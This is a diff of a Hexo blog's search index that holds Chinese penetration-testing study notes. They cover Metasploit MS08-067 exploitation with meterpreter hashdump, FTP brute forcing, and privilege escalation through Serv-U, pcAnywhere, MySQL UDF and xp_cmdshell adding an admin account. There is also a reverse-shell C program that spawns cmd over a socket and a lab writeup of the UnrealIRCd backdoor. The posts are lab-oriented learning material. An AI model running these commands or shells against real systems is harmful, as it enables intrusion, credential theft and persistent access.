/usr/share/windows-binaries/nc.exe c:\\windows\\system32</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -l</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; hashdump  # 读取密码</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; run post/windows/gather/hashdump  # 读取密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; shell</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
+<p><img src="lJasRoT.png" alt="img"></p>
 <h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
 <li>2015 年11月份，来自社区贡献</li>
 <li>无需运行环境，在客户端运行原生 python 代码</li>
@@ -4598,16 +4616,16 @@
 </ul>
 <figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; run</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/oXOv9u8.png" alt="img"></p>
+<p><img src="oXOv9u8.png" alt="img"></p>
 <figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; backgroun</span><br><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; sessions</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/5eADIeS.png" alt="img"></p>
+<p><img src="5eADIeS.png" alt="img"></p>
 <figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; set SESSION <span class="number">4</span></span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/VEpQ5Ut.png" alt="img"></p>
+<p><img src="VEpQ5Ut.png" alt="img"></p>
 <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程错误，迁移进程</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; sessions -i 4</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; migrate 828  # spoolsv.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; background </span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; run</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/DCfpDji.png" alt="img"></p>
+<p><img src="DCfpDji.png" alt="img"></p>
 <h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul>
 <li><p>mssql 扫描端口</p>
 <ul>
@@ -4648,14 +4666,14 @@
 </ul>
 <figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf (scanner/ftp/ftp_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">ftp_version) &gt; run</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.imgur.com/HZ8JVfi.png" alt="img"></p>
+<p><img src="HZ8JVfi.png" alt="img"></p>
 <ul>
 <li><p>是否允许匿名登录</p>
 <figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf auxiliary(scanner/ftp/anonymous) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">anonymous) &gt; run</span></span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p><img src="https://i.imgur.com/A6Ms8B3.png" alt="img"></p>
+<p><img src="A6Ms8B3.png" alt="img"></p>
 <ul>
 <li><p>暴力破解</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/<span class="keyword">ftp</span>/ftp_login</span><br></pre></td></tr></table></figure>
@@ -5479,7 +5497,9 @@
   <entry>
     <title>windows中常见提权方式总结(三)</title>
     <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</url>
-    <content><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul>
+    <content><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要记录一些通过第三方软件提权的方式，主要包括一些ftp管理软件，远程管理软件等等。。。</p>
+<p>[TOC]</p>
+<h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul>
 <li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li>
 <li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li>
 <li>serv-u密码文件：ServUDaemon.ini</li>
@@ -5591,8 +5611,7 @@
 <li>pcAnywher的默认端口为<code>5631、5632</code>。</li>
 <li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li>
 </ul>
-<p><strong>2、提权步骤</strong></p>
-<p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p>
+<h5 id="2、提权步骤"><a href="#2、提权步骤" class="headerlink" title="2、提权步骤"></a><strong>2、提权步骤</strong></h5><p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p>
 <figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dir</span> <span class="regexp">*.cif</span>/s</span><br></pre></td></tr></table></figure>
 
 <p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p>
@@ -5625,7 +5644,20 @@
 <p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p>
 <p><strong>5、登录远程桌面</strong></p>
 <p>在本地打开远程桌面连接器，输入远端IP进行登录。</p>
+<h4 id="第三方软件搜狗输入法提权"><a href="#第三方软件搜狗输入法提权" class="headerlink" title="第三方软件搜狗输入法提权"></a>第三方软件搜狗输入法提权</h4><h5 id="提权简介"><a href="#提权简介" class="headerlink" title="提权简介"></a>提权简介</h5><p>​            搜狗低版本输入法根目录下有一个：<strong>PinyinUp.exe</strong>是用来更新词典用的，管理员为了保存词库，有可能会把搜狗输入法安装到D盘，搜狗输入法目录默认是Everyone可读可写，搜狗每隔一段时间就会自动升级，而升级的文件是<strong>PinyinUp.exe</strong>，</p>
+<p>​            由于搜狗输入法默认设置是自动更新，更新程序没有对exe做任何校验直接在输入法升级时调用运行，导致可以执行恶意代码。</p>
+<h5 id="提权步骤-2"><a href="#提权步骤-2" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>​         我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。搜狗拼音输入法，会定时调用这个文件进行升级，用户无法禁止。</p>
+<p>（很老的一个漏洞了，现在应该这种情况应该也很少见了。。。。。）</p>
+<h4 id="第三方软件之巴西烤肉提权"><a href="#第三方软件之巴西烤肉提权" class="headerlink" title="第三方软件之巴西烤肉提权"></a>第三方软件之巴西烤肉提权</h4><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1547098</a></p>
+<p><a href="https://yqxy20.blog.csdn.net/article/details/99707033" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99707033</a></p>
+<p><a href="https://yqxy20.blog.csdn.net/article/details/99715736" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99715736</a></p>
 ]]></content>
+      <categories>
+        <category>渗透测试学习</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
   </entry>
   <entry>
     <title>常见的被动信息收集方式总结</title>
@@ -5939,7 +5971,12 @@
   <entry>
     <title>windows渗透测试中常见提权方式总结(二)</title>
     <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</url>
-    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
+    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（二）"><a href="#渗透测试中常见提权方式总结（二）" class="headerlink" title="渗透测试中常见提权方式总结（二）"></a>渗透测试中常见提权方式总结（二）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql提权概述"><a href="#mysql提权概述" class="headerlink" title="mysql提权概述"></a>mysql提权概述</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul>
+<li><strong>功能型：</strong>udf提权</li>
+<li><strong>技巧型：</strong>启动项提权</li>
+<li><strong>漏洞型：</strong>mof提权</li>
+</ul>
+<h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
 <p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
 <p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
 <h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p>
@@ -6068,8 +6105,6 @@
 
 <h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net user test pinohd123. /add'</span>    添加用户<span class="built_in">test</span>，密码<span class="built_in">test</span></span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net localgroup administrators test add'</span>    添加<span class="built_in">test</span>用户到管理员组</span><br></pre></td></tr></table></figure>
 
-
-
 <h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
 <h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
 <li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li>
@@ -6104,8 +6139,18 @@
 <li>创建存储过程MYJAVACMD</li>
 <li>执行存储过程，成功添加用户</li>
 </ol>
-<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/0nc3/p/12081189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nc3/p/12081189.html</a></p>
+<p><a href="https://www.webshell.cc/4790.html" target="_blank" rel="noopener">https://www.webshell.cc/4790.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719</a></p>
+<p><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p>
+<h5 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
 ]]></content>
+      <categories>
+        <category>渗透测试学习</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
   </entry>
   <entry>
     <title>渗透测试之免杀入门</title>
@@ -6252,7 +6297,7 @@
 </ul>
 <figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190413174142304.png" alt="在这里插入图片描述"></p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p>
 <ul>
 <li>linux_revers_shell.c</li>
@@ -6264,7 +6309,7 @@
 </ul>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	SOCKET Winsock;</span><br><span class="line">	SOOKET Sock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line">	<span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">	STARTUPINFO ini_processo;</span><br><span class="line">	PROCESS_INFORMATION processo_info;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function">	<span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">	winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">	&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">	host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line">	<span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">	hax.sin_family = AF_INET;</span><br><span class="line">	hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">	hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">	WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">	ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">	ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">	CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190413174154985.png" alt="在这里插入图片描述"></p>
+<p><img src="20190413174154985.png" alt="在这里插入图片描述"></p>
 <h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
 <li>patch<ul>
 <li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li>
@@ -6354,7 +6399,7 @@
 
 </li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145311915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li>
 </ul>
@@ -7513,5 +7558,31 @@
       <tags>
         <tag>绕过CDN</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>msf攻击实验记录</title>
+    <url>/2020/04/30/msf-gong-ji-shi-yan-ji-lu/</url>
+    <content><![CDATA[<h2 id="MSF攻击实验记录"><a href="#MSF攻击实验记录" class="headerlink" title="MSF攻击实验记录"></a>MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p>
+<h3 id="一、msf利用UnrealIRCd后门漏洞攻击"><a href="#一、msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="一、msf利用UnrealIRCd后门漏洞攻击"></a>一、msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p>
+<p><strong>漏洞主机：</strong>linux   IP地址：192.168.153.131</p>
+<h4 id="nmap扫描开放端口"><a href="#nmap扫描开放端口" class="headerlink" title="nmap扫描开放端口"></a>nmap扫描开放端口</h4><p> 利用命令： nmap -sT -v 10.1.1.136 扫描漏洞主机开放端口信息,扫描结果如下</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sT -v <span class="number">192.168</span><span class="number">.153</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429210327.png" alt=""></p>
+<h4 id="UnrealIRCd后门漏洞简介"><a href="#UnrealIRCd后门漏洞简介" class="headerlink" title="UnrealIRCd后门漏洞简介"></a>UnrealIRCd后门漏洞简介</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">CVE：CVE<span class="number">-2010</span><span class="number">-2075</span></span><br><span class="line"></span><br><span class="line">BID：BID<span class="number">-40820</span></span><br><span class="line"></span><br><span class="line">OSVDB：OSVDB<span class="number">-65445</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        在2009年11月到2010年6月间分布于某些镜面站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码，影响系统/软件 Unreal UnrealIRCd 3.2.8.1。</p>
+<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><h5 id="1-分析可以利用的漏洞"><a href="#1-分析可以利用的漏洞" class="headerlink" title="1.分析可以利用的漏洞"></a>1.分析可以利用的漏洞</h5><p>根据Nmap扫描结果可知，6667号端口开放IRC服务，可以利用UnrealIRCD IRC软件的漏洞来攻击漏洞主机</p>
+<h5 id="2-开启Msfconsole"><a href="#2-开启Msfconsole" class="headerlink" title="2. 开启Msfconsole"></a>2. 开启Msfconsole</h5><p>运行“msfconsole”命令开启msf</p>
+<h5 id="3-搜索漏洞利用EXP"><a href="#3-搜索漏洞利用EXP" class="headerlink" title="3. 搜索漏洞利用EXP"></a>3. 搜索漏洞利用EXP</h5><p> 运行</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">search unrealircd</span></span><br></pre></td></tr></table></figure>
+
+<p>命令搜索关于UnrealIRCD漏洞的利用信息</p>
+<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429210558.png" alt=""></p>
+<h5 id="设置漏洞利用exp"><a href="#设置漏洞利用exp" class="headerlink" title="设置漏洞利用exp"></a>设置漏洞利用exp</h5><p>使用’show options’ 命令查看该exploit的参数设置信息，发现执行该EXP前可以配置漏洞主机的IP和端口</p>
+<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429211137.png" alt=""></p>
+<h5 id="执行查看结果"><a href="#执行查看结果" class="headerlink" title="执行查看结果"></a>执行查看结果</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制，</p>
+<p><img src="D:%5Cmsrf%5CQQ%E6%88%AA%E5%9B%BE20200429211204.png" alt=""></p>
+]]></content>
   </entry>
 </search>
